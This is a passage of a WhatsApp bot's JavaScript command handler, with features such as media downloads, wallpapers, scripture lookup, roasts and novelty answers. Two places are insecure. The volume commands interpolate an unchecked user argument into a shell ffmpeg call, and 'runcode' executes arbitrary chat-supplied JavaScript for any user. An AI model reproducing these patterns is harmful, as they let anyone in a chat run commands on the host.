        const apiUrl = `https://api.nexoracle.com/image-processing/${effect}?apikey=free_key@maher_apis&img=${encodeURIComponent(imgUrl)}`;
        await HeavstalTech.sendMessage(m.chat, {
            image: { url: apiUrl },
            caption: `${global.CAPTION}\n\n${footer}`
        }, { quoted: m });
        await HeavstalTech.sendMessage(m.chat, {react: {text: "✅", key: m.key}});
    } catch (err) {
        console.error(err);
        return Vreply(`${mess.error.fitur}\n_Details: ${err.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'naturewlp': {
    try {
        Vreply(mess.wait);
        await loading();
        const query = text || 'nature';
        const response = await fetch(`https://api.kord.live/api/lumina/search?query=${encodeURIComponent(query)}`);
        const data = await response.json();
        const wallpapers = data.wallpapers;

        if (!wallpapers || wallpapers.length === 0) return Vreply(`*${MenuStyle} No wallpapers found for "${query}".*\n\n${footer}`);

        const cards = await Promise.all(wallpapers.slice(0, 5).map(async (wallpaper) => {
            const stats = `❐ ${wallpaper.downloads} | ♥ ${wallpaper.likes} | 👁 ${wallpaper.views}`;
            const details = `Res: ${wallpaper.resolution}`;
            return {
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: details }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: wallpaper.tags.slice(0, 3).join(', ') }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: stats,
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({ image: { url: wallpaper.thumbnail } }, { upload: HeavstalTech.waUploadToServer }))
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: 'Download',
                            url: wallpaper.image,
                            merchant_url: wallpaper.image
                        })
                    }]
                })
            };
        }));

        const interactiveMessage = proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: `*Explore Stunning Wallpapers*\n${footer}` }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `*${query.charAt(0).toUpperCase() + query.slice(1)} Wallpapers*`,
                hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards })
        });

        const msg = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { interactiveMessage } } }, { quoted: m });
        await HeavstalTech.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
        await HeavstalTech.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    } catch (error) {
        console.error(error);
        Vreply(`${mess.error.fitur}\n_Details: ${error.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'ngl': {
    try {
        if (!text || !text.includes(':')) return Vreply(`*${MenuStyle} Invalid format.*\n_Example: ${prefix}ngl username:message_\n\n${footer}`);

        const parts = text.split(":");
        const user = parts[0]?.trim();
        const msg = parts.slice(1).join(":")?.trim();

        if (!user || !msg) return Vreply(`*${MenuStyle} Both username and message are required.*\n\n${footer}`);

        Vreply(mess.wait);
        await loading();

        const response = await fetch(`https://kord-api.vercel.app/ngl?username=${encodeURIComponent(user)}&message=${encodeURIComponent(msg)}`);
        const res = await response.json();

        if (res.success) {
            await HeavstalTech.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            Vreply(`*${MenuStyle} Message sent successfully to "${user}"!*\n\n${footer}`);
        } else {
            Vreply(`*${MenuStyle} Error:*\n_Reason: ${res.message || "Failed to send"}_ \n\n${footer}`);
        }
    } catch (e) {
        console.error(e);
        Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'ps':
case 'pstrength':
case 'passcheck':
case 'passwordcheck': {
    if (!text) return Vreply(`*Please Provide a Password to Audit*\n\nExample: ${prefix + command} mySecretPass123`);
    Vreply(mess.wait)
await loading();
    try {
        const apiKey = HT_API_KEY;
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/password-strength', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ password: text.trim() })
        });
        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const { score, verdict, crack_time, feedback } = res.data;
            const scoreIcons = ['🔴', '🔴', '🟠', '🟡', '🟢'];
            const icon = scoreIcons[score] || '❓';
            let msg = `*🔐 Password Security Auditor*\n\n` +
                      `📊 *Score:* ${score}/4 ${icon}\n` +
                      `⚖️ *Verdict:* ${verdict}\n` +
                      `⏱️ *Crack Time:* ${crack_time}\n\n`;
            if (feedback.warning) {
                msg += `⚠️ *Warning:* ${feedback.warning}\n\n`;
            }
            if (feedback.suggestions && feedback.suggestions.length > 0) {
                msg += `💡 *Suggestions:*\n- ${feedback.suggestions.join('\n- ')}\n`;
            }
            msg += `\n${footer}`;
            await Vreply(msg);
        } else {
            await Vreply(`*Audit Failed*\n\n${res.error || 'Could not analyze password.'}`);
        }
    } catch (e) {
        console.error("Password Check Command Error:", e);
        Vreply(`*Error:* An unexpected error occurred.`);
    }
}
break;
//=================================================//


//=================================================//
case 'bible':
case 'verse':
case 'quran':
case 'surah': {
    if (!text) return Vreply(`*Please provide a reference*\n\nExample: ${prefix}bible John 3:16\nExample: ${prefix}quran 2:255`);
    Vreply(mess.wait)
      await loading();

    try {
        const type = ['bible', 'verse'].includes(command) ? 'bible' : 'quran';
        const apiKey = HT_API_KEY
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/religion', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({
                type: type,
                reference: text.trim(),
                version: 'kjv'
            })
        });

        const res = await response.json();
        if (res.status === 'success' && res.data) {
            if (type === 'bible') {
                const { reference, text, version } = res.data;
                await Vreply(`*📖 Holy Bible (${version})*\n\n*${reference}*\n"${text}"`);
            } else {
                const { reference, arabic, translation, audio } = res.data;
                const msg = `*☪️ Noble Quran*\n\n*${reference}*\n\n${arabic}\n\n_${translation}_`;
                
                await HeavstalTech.sendMessage(m.chat, {
                    audio: { url: audio },
                    mimetype: 'audio/mp4',
                    ptt: true
                }, { quoted: m });
                await Vreply(msg);
            }
        } else {
            await Vreply(`*Request Failed*\n\n${res.error || 'Could not find verse.'}`);
        }
    } catch (e) {
        console.error("Religion Command Error:", e);
        Vreply(`*Error:* An unexpected error occurred.`);
    }
}
break;
//=================================================//


//=================================================//
case 'element': {
    const elementName = text.trim();
    if (!elementName) return Vreply(`*${MenuStyle} Please provide the name of an element.*\n_Example: ${prefix}element Hydrogen_\n\n${footer}`);

    Vreply(mess.wait);
    await loading();

    try {
        const response = await fetch(`https://api.popcat.xyz/periodic-table?element=${encodeURIComponent(elementName)}`);
        const data = await response.json();

        if (data && data.name) {
            const responseText = `*${MenuStyle} Element:* ${data.name}\n` +
                `*${MenuStyle} Symbol:* ${data.symbol}\n` +
                `*${MenuStyle} Atomic Number:* ${data.atomic_number}\n` +
                `*${MenuStyle} Atomic Mass:* ${data.atomic_mass}\n` +
                `*${MenuStyle} Period:* ${data.period}\n` +
                `*${MenuStyle} Phase:* ${data.phase}\n` +
                `*${MenuStyle} Discovered By:* ${data.discovered_by}\n\n` +
                `*Summary:* ${data.summary}\n\n${footer}`;

            await HeavstalTech.sendMessage(m.chat, {
                image: { url: data.image },
                caption: responseText
            }, { quoted: m });
            
            await HeavstalTech.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        } else {
            Vreply(`*${MenuStyle} Element "${elementName}" not found.*\n\n${footer}`);
        }
    } catch (e) {
        console.error(e);
        Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'npmstalk': {
    try {      
        if (!isCreator) return Vreply(mess.owner);
        if (!text) {
            return Vreply(`*${MenuStyle} Please provide an npm package name to search.*\n_Example: ${prefix}npmstalk axios_\n\n${footer}`);
        }
        
        Vreply(mess.wait);
        await loading();
        const pkg = await npmstalk(text);        
        if (!pkg || !pkg.name) {
            return Vreply(`*${MenuStyle} Could not find any information for the package "${text}".*\nPlease check the spelling.\n\n${footer}`);
        }
        
        const replyText = `\`\`\`📦 NPM PACKAGE INFO\`\`\`\n\n` +
            `*${MenuStyle} Name:* ${pkg.name}\n` +
            `*${MenuStyle} Desc:* ${pkg.description}\n\n` +
            `*${MenuStyle} Author:* ${pkg.author}\n` +
            `*${MenuStyle} License:* ${pkg.license}\n` +
            `*${MenuStyle} Latest Version:* v${pkg.latestVersion}\n` +
            `*${MenuStyle} Downloads (Monthly):* ⬇️ ${pkg.downloadsLastMonth}\n\n` +
            `*${MenuStyle} Dependencies (${pkg.dependenciesCount}):* ${pkg.dependenciesList.length > 50 ? pkg.dependenciesList.substring(0, 50) + '...' : pkg.dependenciesList}\n` +
            `*${MenuStyle} Maintainers:* ${pkg.maintainersCount} users\n` +
            `*${MenuStyle} Created:* ${pkg.publishTime}\n` +
            `*${MenuStyle} Last Updated:* ${pkg.latestPublishTime}\n\n` +
            `*🔗 Link:* ${pkg.homepage}\n\n` +
            `${footer}`;
            
        await HeavstalTech.sendMessage(m.chat, {react: {text: "📦", key: m.key}});
        return Vreply(replyText);
    } catch (e) {
        console.error("NPM command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: An error occurred while fetching package information._`);
    }
}
break;
//=================================================//


//=================================================//
case 'breakupl':
case 'breakupline': {
    try {             
        Vreply(mess.wait)
           await loading();
        const response = await fetch("https://api.jcwyt.com/breakup");
        const breakupLine = await response.text();
        if (!breakupLine) {
            return Vreply(`*${MenuStyle} Couldn't think of a breakup line right now. Maybe you should stay together?*\n\n${footer}`);
        }
        const replyText = `\`\`\`${MenuStyle} BREAKUP LINE ${MenuStyle}\`\`\`\n` +
                          `_${breakupLine}_\n\n` +
                          `${footer}`;
        
        await HeavstalTech.sendMessage(m.chat, {react: {text: "💔", key: m.key}});
        return Vreply(replyText);
    } catch (e) {
        console.error("Breakup Line command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: The breakup line API seems to be heartbroken and is not responding._`);
    }
}
break;
//=================================================//


//=================================================//
case 'insult':
case 'roast': {
    try {       
        const target = m.quoted?.sender || m.mentionedJid?.[0] || null;

        if (!target) {
            return Vreply(`*${MenuStyle} Who should I roast?*\nPlease reply to a user or mention them.\n\n${footer}`);
        }
        Vreply(mess.wait)
           await loading();
        const response = await fetch("https://insult.mattbas.org/api/insult.json?who=youuu");
        const data = await response.json();
        const insult = data.insult;

        if (!insult) {
            return Vreply(`*${MenuStyle} I'm out of insults right now. Lucky them.*\n\n${footer}`);
        }
        const mentionTag = `@${target.split("@")[0]}`;
        const finalMessage = insult.replace("youuu", mentionTag);
        await HeavstalTech.sendMessage(m.chat, {
            text: finalMessage,
            mentions: [target]
        }, { quoted: m });

        await HeavstalTech.sendMessage(m.chat, {react: {text: "😈", key: m.key}});

    } catch (e) {
        console.error("Insult command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: The insult API seems too offended to respond._`);
    }
}
break;
//=================================================//


//=================================================//
case 'remini':
case 'upscale':
case 'hd': {
    try {             
        if (!isCreator) return Vreply(mess.owner);
        if (!m.quoted || !m.quoted.image) {
            return Vreply(`*${MenuStyle} Please reply to an image to enhance its quality.*\n\n${footer}`);
        }
        Vreply(mess.wait)
await loading();
        if (typeof upscaleImage !== 'function') {
            return Vreply(`*${MenuStyle} Feature Incomplete.*\nThe 'upscaleImage' function has not been defined. Please contact the developer to set up the image enhancement API.\n\n${footer}`);
        }
        const mediaBuffer = await HeavstalTech.downloadMediaMessage(m.quoted);
        const enhancedImageBuffer = await upscaleImage(mediaBuffer, m.quoted.mtype);
        await HeavstalTech.sendMessage(m.chat, {
            image: enhancedImageBuffer,
            caption: `*${MenuStyle} Here is your upscaled image.*\n\n${footer}`
        }, { quoted: m });

        await HeavstalTech.sendMessage(m.chat, {react: {text: "✅", key: m.key}});

    } catch (err) {
        console.error("Upscale command error:", err);
        return Vreply(`${mess.error.fitur}\n_Details: ${err.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'subtitlesh':
case 'subtitlesearch': {
    try { 
        if (!isCreator) return Vreply(mess.owner);
        if (!text) {
            return Vreply(`*${MenuStyle} Please provide a movie name to search for subtitles.*\n_Example: ${prefix}subtitle The Matrix_\n\n${footer}`);
        }

        Vreply(mess.wait)
await loading();
        const apiUrl = `https://api.kord.live/api/subtitle?q=${encodeURIComponent(text)}`;
        const response = await fetch(apiUrl);
        const data = await response.json();
        
        if (!data || !data.downloadLinks || data.downloadLinks.length === 0) {
            return Vreply(`*${MenuStyle} No subtitles found for "${text}".*\nPlease check the movie title and try again.\n\n${footer}`);
        }
        
        if (data.title && data.title.toLowerCase().includes("tempête dans une tasse de thé")) {
            return Vreply(`*${MenuStyle} The subtitle service is currently busy or returned an invalid result.*\nPlease try again in a few moments.\n\n${footer}`);
        }

        const englishSub = data.downloadLinks.find(sub => sub.language.toLowerCase().includes("english"));

        if (!englishSub) {
            return Vreply(`*${MenuStyle} An English subtitle could not be found for "${data.title}".*\n\n${footer}`);
        }

        const caption = `*${MenuStyle} Title:* ${data.title}\n` +
                        `*${MenuStyle} Language:* English\n\n` +
                        `${global.CAPTION}\n\n${footer}`;

        const subtitleBuffer = await getBuffer(englishSub.url);
        
        await HeavstalTech.sendMessage(m.chat, {
            document: subtitleBuffer,
            mimetype: "application/x-subrip",
            fileName: `${data.title} [English].srt`,
            caption: caption
        }, { quoted: m });

        await HeavstalTech.sendMessage(m.chat, {react: {text: "✅", key: m.key}});

    } catch (e) {
        console.error("Subtitle command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'subtitlesearchdl':
case 'subtitledl': {
    try {
        if (!text) {
            return Vreply(`*${MenuStyle} Please provide a movie name to search.*\n_Example: ${prefix}subtitlesearch Inception_\n\n${footer}`);
        }
        Vreply(mess.wait)
        await loading();
        if (text.startsWith("dl--")) {
            const pageUrl = decodeURIComponent(text.replace("dl--", ""));
            if (pageUrl.toLowerCase().includes("tempête dans une tasse de thé")) {
                return Vreply(`*${MenuStyle} The subtitle service is busy or returned an invalid result.*\nPlease try again later.\n\n${footer}`);
            }
            await Vreply(`*${MenuStyle} Fetching available languages for your selection...*`);
            const dlApiUrl = `https://api.kord.live/api/subtiledl?q=${encodeURIComponent(pageUrl)}`;
            const dlResponse = await fetch(dlApiUrl);
            const availableLanguages = await dlResponse.json();
            if (!Array.isArray(availableLanguages) || availableLanguages.length === 0) {
                return Vreply(`*${MenuStyle} No downloadable subtitles found for this selection.*\n\n${footer}`);
            }
            const englishSub = availableLanguages.find(sub => sub.language.toLowerCase().includes("english"));
            if (!englishSub) {
                return Vreply(`*${MenuStyle} An English subtitle is not available for this selection.*\n\n${footer}`);
            }
            const fileName = decodeURIComponent(pageUrl.split("/").pop().replace(".html", "-en.srt"));
            const subtitleBuffer = await getBuffer(englishSub.url);
            await HeavstalTech.sendMessage(m.chat, {
                document: subtitleBuffer,
                mimetype: "application/x-subrip",
                fileName: fileName,
                caption: `*${MenuStyle} Subtitle Language:* English\n\n${global.CAPTION}\n\n${footer}`
            }, { quoted: m });
            
            return await HeavstalTech.sendMessage(m.chat, {react: {text: "✅", key: m.key}}); 
        } else {
            const searchApiUrl = `https://api.kord.live/api/subtitlepage?q=${encodeURIComponent(text)}`;
            const searchResponse = await fetch(searchApiUrl);
            const searchResults = await searchResponse.json();
            if (!Array.isArray(searchResults) || searchResults.length === 0) {
                return Vreply(`*${MenuStyle} No subtitle results found for "${text}".*\n\n${footer}`);
            }
            const formattedResults = searchResults.slice(0, 10).map(res => ({
                name: `${res.title}`,
                id: `${prefix}subtitlesearch dl--${encodeURIComponent(res.pageUrl)}`
            }));
            await HeavstalTech.sendMessage(m.chat, {
                poll: {
                    name: `*${MenuStyle} Subtitle Search Results for "${text}"*`,
                    values: formattedResults.map(r => r.name),
                    selectableCount: 1
                }
            }, { quoted: m });
            await HeavstalTech.sendMessage(m.chat, {react: {text: "✅", key: m.key}});
        }
    } catch (e) {
        console.error("Subtitle Search command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'video':
case 'ytvideo': {
    try {
        if (!text) {
            return Vreply(`*${MenuStyle} Please provide a video title to search for.*\n_Example: ${prefix}video cats funny moments_\n\n${footer}`);
        }

        await Vreply(mess.wait);
        await loading();
        
        const videoResult = await ytSearch(text);
        if (!videoResult) {
            return Vreply(`*${MenuStyle} No video results found for "${text}".*\n\n${footer}`);
        }

        const videoData = await ytMp4(videoResult.url);
        if (!videoData || !videoData.result) {
            return Vreply(`*${MenuStyle} Could not process the video for download.*\nPlease try a different video.\n\n${footer}`);
        }

        const caption = `*${MenuStyle} Title:* ${videoResult.title}\n` +
                        `*${MenuStyle} Duration:* ${videoResult.duration.timestamp}\n` +
                        `*${MenuStyle} Views:* ${videoResult.views.toLocaleString()}\n` +
                        `*${MenuStyle} Uploaded:* ${videoResult.ago}\n\n` +
                        `${global.CAPTION}\n\n${footer}`;

        await HeavstalTech.sendMessage(m.chat, {
            video: { url: videoData.result },
            caption: caption
        }, { quoted: m });

    } catch (e) {
        console.error("Video command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'playdoc':
case 'musicdoc': {
    try {        
        if (!text) {
            return Vreply(`*${MenuStyle} Please provide a song title to search for.*\n_Example: ${prefix}playdoc Unstoppable Sia_\n\n${footer}`);
        }

        await Vreply(mess.wait);
        await loading();
        const videoResult = await ytSearch(text);
        if (!videoResult) {
            return Vreply(`*${MenuStyle} No audio results found for "${text}".*\n\n${footer}`);
        }

        const audioData = await ytMp3(videoResult.url);
        if (!audioData || !audioData.result) {
            return Vreply(`*${MenuStyle} Could not process the audio for download.*\nPlease try a different song.\n\n${footer}`);
        }

        const audioBuffer = await getBuffer(audioData.result);
        const adReplyCaption = `00:00 ───○─────── ${videoResult.duration.timestamp}`;

        await HeavstalTech.sendMessage(m.chat, {
            document: audioBuffer,
            mimetype: 'audio/mpeg',
            fileName: `${videoResult.title}.mp3`,
            caption: `*${MenuStyle} Now Playing:* ${videoResult.title}\n\n${footer}`,
            contextInfo: {
                externalAdReply: {
                    title: videoResult.title,
                    body: adReplyCaption,
                    mediaType: 2, 
                    renderLargerThumbnail: true,
                    thumbnailUrl: videoResult.thumbnail,
                    sourceUrl: videoResult.url
                }
            }
        }, { quoted: m });
    } catch (e) {
        console.error("Playdoc command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'ytvdoc':
case 'ytmp4doc': {
    try {
        const source = text || m.quoted?.text;
        if (!source) {
            return Vreply(`*${MenuStyle} Please provide a YouTube link or a video title.*\n_You can also reply to a message containing a link._\n\n${footer}`);
        }

        await Vreply(mess.wait);
        const ytRegex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\/.+/;
        const urlsInText = extractUrlsFromString(source);
        let link = urlsInText.find(url => ytRegex.test(url));
        if (!link) {
            const searchResult = await ytSearch(source);
            if (searchResult) {
                link = searchResult.url;
            } else {
                return Vreply(`*${MenuStyle} No results found for your query: "${source}".*\n\n${footer}`);
            }
        }
        
        if (!link || !ytRegex.test(link)) {
             return Vreply(`*${MenuStyle} Invalid input. Could not find a valid YouTube link or search result.*\n\n${footer}`);
        }

        const videoData = await ytMp4(link);
        if (!videoData || !videoData.result) {
            return Vreply(`*${MenuStyle} Could not process the video for download.*\nPlease try a different video or link.\n\n${footer}`);
        }
        
        const videoBuffer = await getBuffer(videoData.result);
        const caption = `*${MenuStyle} Title:* ${videoData.title}\n\n${global.CAPTION}\n\n${footer}`;
        await HeavstalTech.sendMessage(m.chat, {
            document: videoBuffer,
            mimetype: "video/mp4",
            fileName: `${videoData.title}.mp4`,
            caption: caption
        }, { quoted: m });
    } catch (e) {
        console.error("YTVdoc command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'volaudio':
case 'audiovolume': {
if (!(m.quoted && m.quoted.audio)) return Vreply(`Reply to the audio that you want to increase its volume\n\n${footer}`);
if (!args.join(" ")) return Vreply(`Provide amount of volume you want the audio to be increased to\n*Exmaple:* ${prefix + command} 10\n\n${footer}`);
 Vreply(mess.wait) 
 await loading ();             
let media = HeavstalTech.downloadAndSaveMediaMessage(quoted, "volume")
let rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return Vreply(`${mess.error.feature}\n\n_Details:_ ${err}`)
let jadie = fs.readFileSync(rname)
 HeavstalTech.sendMessage(m.chat, { audio: jadie, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
fs.unlinkSync(rname)
})
}
break;
//=================================================//


//=================================================//        
case 'volvideo': 
case 'videovolume': {
if (!(m.quoted && m.quoted.audio)) return Vreply(`Reply to the video that you want to increase its volume\n\n${footer}`);
if (!args.join(" ")) return Vreply(`Provide amount of volume you want the video to be increased to\n*Exmaple:* ${prefix + command} 10\n\n${footer}`);
  Vreply(mess.wait);
  await loading();
let media = HeavstalTech.downloadAndSaveMediaMessage(quoted, "volume");
let rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return Vreply(`${mess.error.feature}\n\n_Details:_ ${err}`)
let jadie = fs.readFileSync(rname)
HeavstalTech.sendMessage(m.chat, { video: jadie, mimetype: 'video/mp4' }, { quoted: m })
fs.unlinkSync(rname)
})
}
break;
//=================================================//


//=================================================//
case 'runcode': {
    if (!text) return Vreply(`Please provide a javascript code to execute\n*Example 1:* ${prefix + command} <JavaScript code>\n*Example 2:* ${prefix + command} comsole.log("Heavstal Tech");`);
    try {
        let consoleOutput = '';
        const customConsole = {
            log: (...args) => {
                consoleOutput += args.join(' ') + '\n';
            }
        };
        const codeFunction = new Function('console', text);
        let result = codeFunction(customConsole);
        if (result instanceof Promise) {
            result = await result;
        }
        const output = consoleOutput ? `\n🖥️ *Console Output:*\n\`\`\`${consoleOutput}\`\`\`` : '';
        const resultMessage = result !== undefined ? `\n✅ *Execution Result:*\n\`\`\`${result}\`\`\`` : '';

        Vreply(`${resultMessage}${output || ''}`);
    } catch (error) {
        Vreply(`❌ *Error:* \n\`\`\`${error.message}\`\`\``);
    }
}
break;
//=================================================//


//=================================================//
case 'when': {
    if (!text) return Vreply(`❓ Ask a question\n\nExample: ${prefix + command} will I get married?`);

    let List = [
        '5 More Days ⏳', '10 More Days ⏳', '15 More Days ⏳', '20 More Days ⏳', '25 More Days ⏳', '30 More Days ⏳',
        '35 More Days ⏳', '40 More Days ⏳', '45 More Days ⏳', '50 More Days ⏳', '55 More Days ⏳', '60 More Days ⏳',
        '65 More Days ⏳', '70 More Days ⏳', '75 More Days ⏳', '80 More Days ⏳', '85 More Days ⏳', '90 More Days ⏳',
        '100 More Days ⏳', '5 Months More 🗓️', '10 Months More 🗓️', '15 Months More 🗓️', '20 Months More 🗓️',
        '25 Months More 🗓️', '30 Months More 🗓️', '35 Months More 🗓️', '40 Months More 🗓️', '45 Months More 🗓️',
        '50 Months More 🗓️', '55 Months More 🗓️', '60 Months More 🗓️', '65 Months More 🗓️', '70 Months More 🗓️',
        '75 Months More 🗓️', '80 Months More 🗓️', '85 Months More 🗓️', '90 Months More 🗓️', '100 Months More 🗓️',
        '1 More Year 📅', '2 More Years 📅', '3 More Years 📅', '4 More Years 📅', '5 More Years 📅',
        'Tomorrow ⏰', 'The Day After Tomorrow ⏰'
    ];

    let when = List[Math.floor(Math.random() * List.length)];
    let finalreply = `*❓Question:* _When ${text}_\n*📨Answer:* _In ${when}_`;

    const imageUrl = 'https://files.catbox.moe/g8pxls.png';

    try {
        await HeavstalTech.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: finalreply,
            mentions: [m.sender]
        });
    } catch (error) {
        console.error(error);
        Vreply('❗ Failed to send image. Please try again later.');
    }
}
break;
//=================================================//


//=================================================//
case 'what': {
    if (!text) return Vreply(`❓ Ask a question\n\nExample: ${prefix + command} is your name?`);

    let answers = [
        '👩‍❤️‍👨 Ask Your GF',
        '🤷‍♂️ I Don’t Know',
        '👨‍👩‍👧 I Don’t Know, Ask Your Father'
    ];

    let RandomAnswer = answers[Math.floor(Math.random() * answers.length)];
    let jawab = `_❓What ${text}_\n_📨 Answer: ${RandomAnswer}_`;

    const imageUrl = 'https://files.catbox.moe/g8pxls.png';

    try {
        await HeavstalTech.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: jawab,
            mentions: [m.sender]
        });
    } catch (error) {
        console.error(error);
        Vreply('❗ Failed to send image. Please try again later.');
    }
}
break;
//=================================================//


//=================================================//
case 'where': {
    if (!text) return Vreply(`❓ Ask a question\n\nExample: ${prefix + command} is your ex?`);

    let places = [
        '🏞️ In the mountain',
        '🌕 On Mars',
        '🌙 On the moon',
        '🌳 In the jungle',
        '👩‍👧 I don’t know, ask your mom',
        '🤷‍♂️ It could be somewhere',
        '⚖️ In jail'
    ];

    let kah = places[Math.floor(Math.random() * places.length)];
    let jawab = `_❓Where ${text}_\n_📨 Answer: ${kah}_`;

    const imageUrl = 'https://files.catbox.moe/g8pxls.png';

    try {
        await HeavstalTech.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: jawab,
            mentions: [m.sender]
        });
    } catch (error) {
        console.error(error);
        Vreply('❗ Failed to send image. Please try again later.');
    }
}
break;
//=================================================//


//=================================================//
case 'how': {
    if (!text) return Vreply(`❓ Ask a question\n\nExample: ${prefix + command} to date a girl?`);

    let gimana = [
        '🤔 Ummm...',
        '😅 It’s Difficult Bro',
        '🚫 Sorry, the bot can’t answer',
        '🔍 Try searching on Google',
        '😱 Holy cow! Really?',
        '😴 I’m too dizzy to answer',
        '🙁 Oh, I see :(',
        '⏳ Be patient, boss',
        '🙄 Really, dude?'
    ];

    let kah = gimana[Math.floor(Math.random() * gimana.length)];
    let jawab = `_❓How ${text}_\n_📨 Answer: ${kah}_`;

    const imageUrl = 'https://files.catbox.moe/g8pxls.png';

    try {
        await HeavstalTech.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: jawab,
            mentions: [m.sender]
        });
    } catch (error) {
        console.error(error);
        Vreply('❗ Failed to send image. Please try again later.');
    }
}
break;
//=================================================//


//=================================================//
case 'rate': {
            	if (!text) return Vreply(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
let kah = ra[Math.floor(Math.random() * ra.length)]
let jawab = `_🕊️ Rate *${text}_\n_📨 Answer : ${kah}%_`
            await Vreply(jawab)
            }
            break;
//=================================================//            
       

//=================================================//       
           case 'soulmate': {
            if (!m.isGroup) return Vreply(mess.only.group)
            let member = participants.map(u => u.id)
            let jodoh = member[Math.floor(Math.random() * member.length)]
HeavstalTech.sendMessage(m.chat,
{ text: `👫Your Soulmate Is @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": `${global.thumbnail}`,
"sourceUrl": `${wagc}`}}},
{ quoted: m })        
            }
            break;
//=================================================//            
            
 
//=================================================//
 case 'couple': {
            if (!m.isGroup) return Vreply(mess.only.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
HeavstalTech.sendMessage(m.chat,
{ text: `*Successfully Found 2 compatible couples*\n @${orang.split('@')[0]} & @${jodoh.split('@')[0]} ❤️🥹❤️🌹`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": `${global.thumbnail}`,
"sourceUrl": `${wagc}`}}},
{ quoted: m })        
            }
            break;
//=================================================//            
            
            
//=================================================//            
case 'ytmp3': case 'ytaudio': case 'ytplayaudio': {
  if (!text) return Vreply(`📌 *Example:* ${prefix + command} <youtube_url>`);
  if (!text.includes('youtu')) return Vreply('❌ *The URL does not contain results from YouTube!*');
  
  try {
      const hasil = await ytMp3(text);
     Vreply(mess.wait);
     await loading();
      
      await HeavstalTech.sendMessage(m.chat, {
          audio: { url: hasil.result },
          mimetype: 'audio/mpeg',
          contextInfo: {
              externalAdReply: {
                  title: hasil.title,
                  body: hasil.channel,
                  previewType: 'PHOTO',
                  thumbnailUrl: hasil.thumb,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                  sourceUrl: text
              }
          }
      }, { quoted: m });

      Vreply(`🎧 *Now Playing:* ${hasil.title}\n` +
                    `🎬 *Channel:* ${hasil.channel}\n` +
                    `📅 *Uploaded On:* ${hasil.uploadDate}\n` +
                    `💾 *Size:* ${hasil.size}\n\n` +
                    `${footer}`);
  } catch (err) {
      console.error('❌ Error downloading audio:', err);
      Vreply(`${mess.error.feature}\n_Details:_${err}`);
  }
}
break;
//=================================================//


//=================================================//
